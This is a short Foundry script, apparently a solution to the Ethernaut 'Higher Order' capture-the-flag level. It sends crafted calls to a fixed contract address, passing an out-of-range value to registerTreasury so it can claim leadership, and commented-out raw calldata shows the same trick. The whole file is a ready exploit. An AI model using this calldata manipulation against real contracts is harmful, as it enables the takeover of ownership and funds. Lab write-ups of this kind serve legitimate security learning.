// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract HigherOrderHackScript is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address target = address(0x9a08439D309990cb09f784A2EA41023B3Cc6A9a6);

        //bytes memory data1 = hex"211c85abffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
        //target.call(data1);
        //bytes memory data2 = hex"5b3e8fe7";
        //target.call(data2);
        target.call(abi.encodeWithSignature("registerTreasury(uint8)", 256));
        target.call(abi.encodeWithSignature("claimLeadership()"));
        vm.stopBroadcast();
    }
}
